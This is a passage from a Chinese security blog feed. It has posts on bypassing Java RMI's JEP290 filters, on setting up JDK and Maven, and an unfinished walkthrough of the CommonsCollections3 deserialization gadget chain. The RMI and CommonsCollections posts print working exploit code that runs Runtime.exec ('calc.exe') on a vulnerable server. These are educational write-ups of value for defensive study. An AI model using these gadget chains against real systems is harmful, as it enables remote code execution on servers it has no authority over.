title="内置过滤器"></a>内置过滤器</h3><p>JDK分别为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。例如：JDK版本换成JDK1.8.0_181，就默认使用内置过滤器。可用白名单列表如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String.class</span><br><span class="line">Number.class</span><br><span class="line">Remote.class</span><br><span class="line">Proxy.class</span><br><span class="line">UnicastRef.class</span><br><span class="line">RMIClientSocketFactory.class</span><br><span class="line">RMIServerSocketFactory.class</span><br><span class="line">ActivationID.class</span><br><span class="line">UID.class</span><br></pre></td></tr></table></figure><h2 id="0x04-绕过JEP290"><a href="#0x04-绕过JEP290" class="headerlink" title="0x04 绕过JEP290"></a>0x04 绕过JEP290</h2><h3 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h3><p>用<strong>UnicastRef对象新建一个RMI连接</strong>绕过JEP290的限制，下面是ysoserial的payload：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/10.png" alt></p><p>原理就是利用在白名单的UnicastRef类来发起一个RMI连接,在高版本jdk下ysoserial的JRMPListener依然可以利用。</p><h3 id="用Object绕JEP290限制"><a href="#用Object绕JEP290限制" class="headerlink" title="用Object绕JEP290限制"></a>用Object绕JEP290限制</h3><p>JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器，在<strong>RMI客户端和服务端在通信时参数传递</strong>这块是没有做处理的，而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload，传输依然会有问题。</p><p>首先定义HelloInterface接口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">public interface HelloInterface extends java.rmi.Remote &#123;</span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException;</span><br><span class="line">    public Object sayPayload(Object from) throws java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意sayPayload方法的返回类型就是Object – Object在Java中是各种类型的根类。</p></blockquote><p>然后实现接口HelloImpl：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123;</span><br><span class="line">    public HelloImpl() throws java.rmi.RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return &quot;sayHello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object sayPayload(Object from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现服务端（把注册中心也写在了服务端里面）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello&quot;, new Rmi.ObjectBypassJEP.HelloImpl());</span><br><span class="line">        &#125; catch (RemoteException | AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;while(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现恶意客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HelloClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(&quot;hello&quot;);</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                            new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                            new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                            new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                            new Class[]&#123;String.class&#125;,</span><br><span class="line">                            new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">            TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</span><br><span class="line">            BadAttributeValueExpException poc = new BadAttributeValueExpException(null);</span><br><span class="line">            Field valfield = poc.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            valfield.setAccessible(true);</span><br><span class="line">            valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">            hello.sayPayload(poc);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>同样的恶意客户端先通过getRegistry获取注册中心（服务端）并lookup绑定的hello。随后构造恶意类并调用绑定的方法，即可传恶意序列化数据使服务端RCE。</p></blockquote><p>我在JDK8u211的版本下能成功执行弹出服务端的计算器，如下所示：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/11.png" alt></p><p>然而在实际使用场景很少有参数是Object类型的，而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String)，具体有如下四种bypass的思路：</p><blockquote><p>际使用场景很少有参数是Object类型：即是说服务端很少有人会写返回类型是Object型的方法的。</p></blockquote><ul><li>将java.rmi包的代码复制到新包，并在新包中修改相应的代码</li><li>将调试器附加到正在运行的客户端，并在序列化之前替换这些对象</li><li>使用诸如Javassist这样的工具修改字节码</li><li>通过实现代理替换网络流上已经序列化的对象</li></ul><p>未完待续…</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">https://paper.seebug.org/1194/</a> </li><li><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660</a> </li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a> </li><li><a href="https://xz.aliyun.com/t/7264#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7264#toc-2</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;反序列化之RMI&quot;&gt;&lt;a href=&quot;#反序列化之RMI&quot; class=&quot;headerlink&quot; title=&quot;反序列化之RMI&quot;&gt;&lt;/a&gt;反序列化之RMI&lt;/h1&gt;&lt;p&gt;前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JDK</title>
    <link href="http://bai-ren-1.github.io/2020/07/24/JDK/"/>
    <id>http://bai-ren-1.github.io/2020/07/24/JDK/</id>
    <published>2020-07-24T12:44:10.000Z</published>
    <updated>2020-07-25T01:46:08.979Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h1><p>再水一水一篇无聊的文章。hhh，都是很简单的内容，因为环境在公司搭建的，很多时候回到家里就懒得复现搭建。今天突然心情大好，就记录记录这些简单的东西。</p><h2 id="0x00-JDK版本"><a href="#0x00-JDK版本" class="headerlink" title="0x00 JDK版本"></a>0x00 JDK版本</h2><p>下面只是个人的见解，不过应该没错的啦：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDK8 &gt;= JDK1.8.121 = JDK8u121</span><br></pre></td></tr></table></figure><blockquote><p>当然JDK不止121这个版本，还会有261等版本；但是这些版本都是属于JDK8，而且正式写的话是叫JDK1.8。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDK11 &gt;= JDK11.0.8</span><br></pre></td></tr></table></figure><blockquote><p>当然JDK现在出到11，超出了10，所以就直接版本号这样定义咯。</p></blockquote><h2 id="0x01-JDK共存"><a href="#0x01-JDK共存" class="headerlink" title="0x01 JDK共存"></a>0x01 JDK共存</h2><p>很多时候研究Java的payload的时候很吃JDK的版本，或者是一些依赖。所以吧，设置多个JDK版本来备用是个好习惯。首先建立一个要使用的系统变量JAVA_HOME，然后根据自己下载的JDK版本新建不同的带有版本信息的JAVA_HOMEX的环境变量：</p><p><img src="/2020/07/24/JDK/1.png" alt></p><blockquote><p>要使用JDKX的话就将JAVA_HOME的值改为%JAVA_HOMEX%，这里我是用JDK8</p></blockquote><p><img src="/2020/07/24/JDK/2.png" alt></p><p>然后再系统变量Path添加前两项（bin和jre\bin）后就可以啦。最后新建一个classpath就可以了：</p><p><img src="/2020/07/24/JDK/8.png" alt></p><p>以后你要切换哪个就修改环境变量JAVA_HOME的值就可以了。</p><h2 id="0x02-IDEA切换版本"><a href="#0x02-IDEA切换版本" class="headerlink" title="0x02 IDEA切换版本"></a>0x02 IDEA切换版本</h2><p>有时打开IDEA打到兴头上，根本不想切换JDK。其实IDEA里面可以直接选择使用的JDK：</p><p><img src="/2020/07/24/JDK/3.png" alt></p><p>点击右上角的项目结构的按钮，然后按下面添加其他JDK的路径：</p><p><img src="/2020/07/24/JDK/4.png" alt></p><p>当然这个是我自己在公司试的，当时是有用的。也不知道是不是正解，无效请自行上网搜索。</p><p><img src="/2020/07/24/JDK/5.png" alt></p><p>上面切换后编译提示找不到JDK的classpath的话就把这个选项去了：</p><p><img src="/2020/07/24/JDK/9.png" alt></p><h2 id="0x03-Maven"><a href="#0x03-Maven" class="headerlink" title="0x03 Maven"></a>0x03 Maven</h2><p>IDEA中配置Maven之前就做好啦，当时没想记录这些简单的东西，将就一下吧。</p><p><img src="/2020/07/24/JDK/6.png" alt></p><p>要使用Maven的话就偷偷藏在那里，点开就有许多命令可以使用了。噢噢然后写Sonar的时候得跳过它的检测进行打包Jar，如果使用Maven进行打包Jar的话，得选择跳过检测的选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure><p><img src="/2020/07/24/JDK/7.png" alt></p><p>执行完就可以再target文件夹里拿到你的Jar包啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JDK&quot;&gt;&lt;a href=&quot;#JDK&quot; class=&quot;headerlink&quot; title=&quot;JDK&quot;&gt;&lt;/a&gt;JDK&lt;/h1&gt;&lt;p&gt;再水一水一篇无聊的文章。hhh，都是很简单的内容，因为环境在公司搭建的，很多时候回到家里就懒得复现搭建。今天突然心情大好，就记录记录
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections3利用链</title>
    <link href="http://bai-ren-1.github.io/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>http://bai-ren-1.github.io/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2020-07-19T10:18:39.000Z</published>
    <updated>2020-07-19T14:49:14.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3利用链"><a href="#CommonsCollections3利用链" class="headerlink" title="CommonsCollections3利用链"></a>CommonsCollections3利用链</h1><p>2015年最大的漏洞莫过于CommonsCollections反序列化漏洞了。它借用了Java反序列化和Apache Commons Collections这一基础类库，从而实现远程命令执行。然后下面记录的就是Commons Collections3的版本的方法进行构造调用链的过程和分析。</p><h2 id="0x00-CommonsCollections调用链执行"><a href="#0x00-CommonsCollections调用链执行" class="headerlink" title="0x00 CommonsCollections调用链执行"></a>0x00 CommonsCollections调用链执行</h2><p>首先在<a href="https://github.com/frohoff/ysoserial上下载打包好的JAR包，新建一个Java项目《Java反序列化》，然后把ysoserial拉进项目文件夹中。基本的项目结构如下：" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial上下载打包好的JAR包，新建一个Java项目《Java反序列化》，然后把ysoserial拉进项目文件夹中。基本的项目结构如下：</a></p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/1.png" alt></p><p>然后我们上面红圈的地方，右键导入后选择”Add as Library”。然后在弹出的窗口中选择OK就可以啦。这一步的目的是将CommonsCollections3中使用的依赖方法进行引入。</p><blockquote><p>所以要使用这个方法攻击服务器需要服务器上存在CommonsCollections3的环境。</p></blockquote><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/2.png" alt></p><p>首先贴上调用链执行的代码和效果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonsCollections3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123; String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformeredChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">// 构成调用链：((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null).exec("calc.exe"));</span></span><br><span class="line">        Map normalMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        normalMap.put(<span class="string">"value"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap,<span class="keyword">null</span>,transformeredChain);</span><br><span class="line">        Map.Entry entry =(Map.Entry)transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行这段代码就会成功弹出计算器：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/3.png" alt></p><h2 id="0x01-CommonsCollections调用链关键点"><a href="#0x01-CommonsCollections调用链关键点" class="headerlink" title="0x01 CommonsCollections调用链关键点"></a>0x01 CommonsCollections调用链关键点</h2><h3 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的<strong>第三方基础库</strong>，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p><h3 id="TransformedMap类"><a href="#TransformedMap类" class="headerlink" title="TransformedMap类"></a>TransformedMap类</h3><p><strong>TransformedMap类</strong>是Apache CommonsCollections 组件中的一个<strong>实现类</strong>。TransformedMap是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由<strong>Transformer类</strong>定义，Transformer在TransformedMap实例化时作为参数传入。</p><p>我们可以通过TransformedMap.decorate()方法，获得一个TransformedMap的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map transformedMap = TransformedMap.decorate(map,keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure><p>当<strong>TransformedMap内的key 或者 value发生变化时，就会触发相应的Transformer的transform()方法</strong>。另外，还可以使用Transformer数组构造成ChainedTransformer。当触发时，<strong>ChainedTransformer可以按顺序调用一系列的变换</strong>。</p><blockquote><p>第一句解释了代码执行的触发点：TransformedMap的键值对中的值发生改变时就会触发Transformer类中的transform方法中的代码。</p><p>第二据解释了代码调用链的构造：Transformer数组能构成一条链ChainedTransformer，上面代码触发时会链式地调用ChainedTransformer中的方法。</p></blockquote><p>关于上面这两点为何要这么选择？这个链接进行了很好的解释：<a href="https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/</a></p><h3 id="InvokerTransformer类"><a href="#InvokerTransformer类" class="headerlink" title="InvokerTransformer类"></a>InvokerTransformer类</h3><p>先贴上InvokerTransformer类的构造函数的定义和它的transform方法的定义：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt></p><p>我把需要分析的完整（省略了一部分方法）的代码放在下面，注意注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import org.apache.commons.collections.FunctorException;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line">public class InvokerTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = -8653385846894047688L;</span><br><span class="line">    private final String iMethodName;</span><br><span class="line">    private final Class[] iParamTypes;</span><br><span class="line">    private final Object[] iArgs;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// InvokerTransformer的构造方法，可以看到三个用来作为反射参数的成员变量（iMethodName、iParamTypes、iArgs）都是通过构造函数直接赋值的，并未作过滤。</span><br><span class="line">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName = methodName;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                // 调用链触发后会执行transform方法，核心就是这里的利用反射特性去调用iMethodName、iParamTypes和iArgs所指的类的方法</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Java反射特性相关的函数：getClass、getMethod、invoke</p><p>getClass：public final Class getClass()，它返回对对象的Class对象的引用。</p><p>getMethod：Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法。getMethod的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。</p><p>invoke：Method类的invoke(Object obj,Object args[])方法接收的参数必须为对象，返回值总是对象。用来执行某个的对象的目标方法。</p></blockquote><h3 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h3><p>由于完成Runtime.getRuntime().exec()的动作需要多次调用transform函数（先调用Runtime.getRuntime再调用Runtime.exec），所以还得找一个能多次调用transform的地方。这时候就需要用到ChainedTransformer进行调用类的串联了（即是上面ChainedTransformer可以按顺序调用一系列的变换的原因）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private final Transformer[] iTransformers;// 填充构造后的实例</span><br><span class="line"></span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);// 调用链，</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-CommonsCollections调用链过程"><a href="#0x02-CommonsCollections调用链过程" class="headerlink" title="0x02 CommonsCollections调用链过程"></a>0x02 CommonsCollections调用链过程</h2><p>如果上面的CommonsCollections中的关键点弄清的话，现在就来解释调用链执行弹出计算器的过程。首先解释代码的第一部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br></pre></td></tr></table></figure><p>这部分的代码其实就只是构建了一个Transformer类的数组，在transformers数组中定义了四个元素：一个ConstantTransformer对象和三个InvokerTransformer对象。这时候我们复习上面提及的InvokerTransformer类的构造方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">this.iMethodName = 